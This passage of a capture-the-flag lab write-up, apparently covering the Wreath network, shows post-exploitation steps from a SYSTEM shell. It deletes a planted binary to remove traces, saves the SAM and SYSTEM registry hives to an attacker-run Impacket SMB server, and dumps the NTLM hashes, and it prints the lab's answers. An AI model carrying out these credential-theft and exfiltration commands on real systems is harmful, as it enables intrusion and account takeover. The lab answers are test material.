C:\\Windows\\system32>whoami
nt authority\\system
```
SYSTEM privilege acquisition was successful.
After use is complete, let's remove the traces.

**Command:**
```bash
del "C:\\Program Files (x86)\\System Explorer\\System.exe"
# Delete System.exe

sc start SystemExplorerHelpService
# Restore service to normal
```
### \[ Task 44 - Exfiltration Techniques & Post Exploitation \]
The goal of Task 44 is to use the obtained SYSTEM privileges to dump SAM hashes and exfiltrate them to the attacking machine.
Since Mimikatz is detected by Windows Defender, we will use a method of directly dumping the SAM hive and extracting hashes locally.
First, run an Impacket SMB server locally.

**Command (Local shell):**
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
# Run SMB server
```
Next, save the SAM and SYSTEM hives to the SMB server from the SYSTEM shell.

**Command (SYSTEM shell):**
```bash
net use \\\\10.250.180.9\\share /USER:user s3cureP@ssword
# Connect to SMB server

reg.exe save HKLM\\SAM \\\\10.250.180.9\\share\\sam.bak
# Save SAM hive

reg.exe save HKLM\\SYSTEM \\\\10.250.180.9\\share\\system.bak
# Save SYSTEM hive

net use \\\\10.250.180.9\\share /del
# Disconnect SMB connection
```
**Result:**
```bash
C:\\Windows\\system32>net use \\\\10.250.180.9\\share /USER:user s3cureP@ssword
The command completed successfully.

C:\\Windows\\system32>reg.exe save HKLM\\SAM \\\\10.250.180.9\\share\\sam.bak
The operation completed successfully.

C:\\Windows\\system32>reg.exe save HKLM\\SYSTEM \\\\10.250.180.9\\share\\system.bak
The operation completed successfully.

C:\\Windows\\system32>net use \\\\10.250.180.9\\share /del
\\\\10.250.180.9\\share was deleted successfully.
```
Next, dump hashes using Impacket's secretsdump locally.

**Command (Local shell):**
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
# Dump SAM hashes
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```
We obtained the Administrator's NT hash.
This established complete access to the third machine (10.200.180.100) in the Wreath network.

**Answer:**
```bash
FTP is a bad protocol to use when exfiltrating data in a modern network (Aye/Nay)?
#Aye

What is the reason HTTPS is preferable over HTTP during exfiltration?
#Encryption

What is the Administrator NT hash?
#a05c3c807ceeb48c47252568da284cd2
```
